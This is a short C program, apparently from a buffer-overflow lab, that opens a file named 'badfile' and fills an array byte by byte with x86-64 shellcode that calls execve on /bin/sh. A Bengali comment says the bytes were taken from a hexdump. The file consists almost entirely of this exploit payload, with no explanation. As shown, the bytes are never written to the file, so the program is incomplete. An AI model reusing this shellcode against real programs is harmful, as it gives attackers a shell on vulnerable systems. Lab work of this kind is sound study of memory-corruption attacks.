#include <stdio.h>



/*
  probable assembly:
  ------------------


*/  

int main()
{
    FILE* fp = fopen("badfile", "w");

    char code[1000];
    int idx = 0;

    // opcode directly hexdump theke neoa
    code[idx++]= 0xb8;  code[idx++] = 0x2f;
    code[idx++]= 0x73;  code[idx++] = 0x68;
    code[idx++]= 0xff;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe0;
    code[idx++]= 0x28;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe8;
    code[idx++]= 0x08;  code[idx++] = 0x48;
    code[idx++]= 0x0d;  code[idx++] = 0x2f;
    code[idx++]= 0x62;  code[idx++] = 0x69;
    code[idx++]= 0x6e;  code[idx++] = 0x50;
    code[idx++]= 0x48;  code[idx++] = 0x89;
    code[idx++]= 0xe7;  code[idx++] = 0x48;
    code[idx++]= 0x31;  code[idx++] = 0xc0;
    code[idx++]= 0x50;  code[idx++] = 0x57;
    code[idx++]= 0x48;  code[idx++] = 0x89;
    code[idx++]= 0xe6;  code[idx++] = 0x48;
    code[idx++]= 0x31;  code[idx++] = 0xd2;
    code[idx++]= 0xb8;  code[idx++] = 0x3b;
    code[idx++]= 0xff;  code[idx++] = 0xff;
    code[idx++]= 0xff;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe0;
    code[idx++]= 0x38;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe8;
    code[idx++]= 0x38;  code[idx++] = 0x0f;
    code[idx++]= 0x05;

    return 0;
}
